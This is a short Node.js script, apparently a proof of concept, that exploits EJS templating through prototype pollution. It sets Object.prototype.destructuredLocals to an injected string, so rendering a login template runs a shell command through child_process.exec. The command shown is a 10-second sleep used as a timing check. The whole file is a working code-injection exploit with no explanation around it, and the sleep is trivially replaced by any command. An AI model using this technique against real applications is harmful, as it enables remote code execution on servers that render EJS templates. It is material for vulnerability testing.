const ejs = require('ejs')
const path = require('path');
const templatePath = path.join(__dirname, 'views', 'login_register.ejs');


Object.prototype.destructuredLocals = ["__line=__line;global.process.mainModule.require('child_process').exec('bash -c \"sleep 10\"');//"]


var result = ejs.renderFile(templatePath, {
    title:" storeHtml | logins ",
    buttonHintF:"login",
    buttonHintS:"No account? Register now",
    hint:"login",
    next:"/register"
})

